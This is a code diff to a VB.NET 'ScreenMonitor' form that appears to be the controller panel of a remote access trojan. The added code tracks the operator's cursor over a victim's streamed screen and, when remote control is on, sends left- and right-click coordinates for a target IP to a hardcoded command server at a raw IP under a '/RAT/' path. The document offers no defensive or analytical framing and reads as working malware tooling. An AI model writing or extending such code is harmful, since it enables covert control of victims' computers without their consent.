@@ -9,7 +9,8 @@ Public Class ScreenMonitor
     Private transmissionThread As Threading.Thread = Nothing
     Private startMonitorSpamWC, fluxManagementWC As New WebClient()
     Private connectionEstablished As Boolean = False
-
+    Public xPosRemote As String = ""
+    Public yPosRemote As String = ""
     Private Sub ScreenMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Screen Monitor  @ " & targetIp
     End Sub
@@ -101,6 +102,8 @@ Public Class ScreenMonitor
         End If
     End Sub
 
+
+
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
         Dim s As String = "abcdefghijklmnopqrstvuwxyz"
         Dim r As New Random : Dim sb As New StringBuilder
@@ -119,4 +122,37 @@ displayimage:
             GoTo displayimage
         End Try
     End Sub
+
+
+    Private Sub Render_MouseMove(sender As Object, e As MouseEventArgs) Handles Render.MouseMove
+        Dim Width As String = Render.Width.ToString
+        Dim Height As String = Render.Height.ToString
+        xPosRemote = Math.Round(((e.X / Width) * 100))
+        yPosRemote = Math.Round(((e.Y / Height) * 100))
+    End Sub
+
+#Region "MouseClick"
+    Dim sendcords As New WebClient()
+    Private Sub Render_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Render.Click
+        If e.Button = MouseButtons.Right Then
+            If remotecontrol.Checked Then
+                sendcords.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 3)
+            End If
+        End If
+
+        If e.Button = MouseButtons.Left Then
+            If remotecontrol.Checked Then
+                sendcords.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 1)
+            End If
+        End If
+
+    End Sub
+
+#End Region
+
+
+
+
+
+
 End Class
